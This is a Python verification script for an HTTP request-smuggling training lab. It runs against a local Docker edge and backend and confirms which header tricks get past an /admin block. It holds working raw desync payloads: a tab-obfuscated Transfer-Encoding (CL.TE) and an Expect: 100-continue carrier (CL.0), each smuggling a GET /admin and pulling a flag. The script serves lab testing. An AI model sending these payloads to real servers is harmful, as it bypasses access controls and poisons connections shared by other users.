"""Self-check for the Expect / obfuscation desync lab (class 5).

Proves, through the edge:
  1. direct /admin is 403 at the edge;
  2. the CANONICAL Transfer-Encoding spelling is SAFE (the edge honors it, so the
     smuggled bytes are blocked at the edge, not forwarded);
  3. an OBFUSCATED Transfer-Encoding (tab separator) flips the edge to Content-Length
     while the backend still honors chunked -> CL.TE smuggle reaches /admin;
  4. an Expect: 100-continue carrier makes the backend ignore the body (CL.0) ->
     smuggle reaches /admin.

A successful queue-poison leaves the pooled upstream off by one, so the edge is
restarted between the two terminal desync vectors for a clean, deterministic check.

  python3 tests/verify_expect.py [host] [port] [edge_container]
      # defaults: 127.0.0.1 9096 exp-guinea-edge
"""
import re
import socket
import subprocess
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9096
EDGE = sys.argv[3] if len(sys.argv) > 3 else "exp-guinea-edge"


def send_full(payload, read_timeout=8):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(read_timeout)
    s.connect((HOST, PORT))
    s.sendall(payload)
    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    return data


def first_line(resp):
    return resp.split(b"\r\n", 1)[0].decode("latin-1", "replace") if resp else "(none)"


def reset_edge():
    try:
        subprocess.run(["docker", "restart", EDGE], check=True,
                       capture_output=True, timeout=30)
    except Exception as e:  # noqa: BLE001
        print(f"  (warning: could not restart {EDGE}: {e}; continuing)")
        return
    for _ in range(30):
        try:
            if b"200" in send_full(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", 2):
                return
        except OSError:
            pass
        time.sleep(0.5)


SMUGGLED = b"GET /admin HTTP/1.1\r\nX: x\r\n\r\n"


def smuggle_and_follow(carrier):
    send_full(carrier, read_timeout=4)
    time.sleep(0.3)
    return send_full(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")


def main():
    # 1. control
    control = send_full(b"GET /admin HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    assert b"403" in control, f"expected 403 at edge for /admin, got {first_line(control)}"
    print("1. direct /admin at edge:", first_line(control))

    # 2. canonical TE is SAFE (edge honors it; leftover is blocked at the edge)
    reset_edge()
    body = b"0\r\n\r\n" + SMUGGLED
    canonical = (b"POST / HTTP/1.1\r\nHost: x\r\n"
                 + f"Content-Length: {len(body)}\r\n".encode()
                 + b"Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n" + body)
    follow = smuggle_and_follow(canonical)
    assert b"REDAMON_HRS{" not in follow, "canonical TE leaked /admin (edge should honor it)"
    print("2. canonical TE smuggle -> follow-up:", first_line(follow), "(no flag = safe)")

    # 3. obfuscated TE (tab) flips the edge -> CL.TE smuggle
    reset_edge()
    obf = (b"POST / HTTP/1.1\r\nHost: x\r\n"
           + f"Content-Length: {len(body)}\r\n".encode()
           + b"Transfer-Encoding:\tchunked\r\nConnection: keep-alive\r\n\r\n" + body)
    follow = smuggle_and_follow(obf)
    m = re.search(rb"REDAMON_HRS\{[^}]*\}", follow)
    assert m, f"obfuscated TE did not smuggle; follow-up was {first_line(follow)}"
    print("3. obfuscated TE (tab) smuggle -> follow-up:", first_line(follow), "flag:", m.group(0).decode())

    # 4. Expect: 100-continue carrier -> backend CL.0 -> smuggle
    reset_edge()
    exp = (b"POST /submit HTTP/1.1\r\nHost: x\r\nExpect: 100-continue\r\n"
           + f"Content-Length: {len(SMUGGLED)}\r\n".encode()
           + b"Connection: keep-alive\r\n\r\n" + SMUGGLED)
    follow = smuggle_and_follow(exp)
    m = re.search(rb"REDAMON_HRS\{[^}]*\}", follow)
    assert m, f"Expect carrier did not smuggle; follow-up was {first_line(follow)}"
    print("4. Expect:100-continue smuggle -> follow-up:", first_line(follow), "flag:", m.group(0).decode())

    print("OK: Expect + obfuscated-TE desync confirmed; canonical TE stays safe.")


if __name__ == "__main__":
    main()
